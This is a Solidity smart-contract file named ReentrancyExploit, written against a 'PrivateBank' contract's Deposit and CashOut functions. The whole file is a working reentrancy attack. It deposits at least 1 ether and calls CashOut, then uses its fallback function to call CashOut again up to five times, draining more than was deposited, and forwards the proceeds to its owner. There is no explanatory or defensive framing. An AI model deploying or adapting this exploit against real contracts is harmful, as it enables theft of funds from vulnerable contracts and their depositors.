pragma solidity ^0.4.19;

interface IPrivateBank {
    function Deposit() external payable;
    function CashOut(uint _am) external;
}

contract ReentrancyExploit {
    IPrivateBank public target;
    address public owner;
    uint public attackCount;
    uint public maxAttacks = 5; // limit recursion to prevent gas exhaustion

    constructor(address _target) public {
        target = IPrivateBank(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether); // match MinDeposit
        target.Deposit.value(msg.value)();
        target.CashOut(msg.value);
    }

    function () public payable {
        if (attackCount < maxAttacks) {
            attackCount++;
            target.CashOut(msg.value);
        }
    }

    function withdraw() external {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}

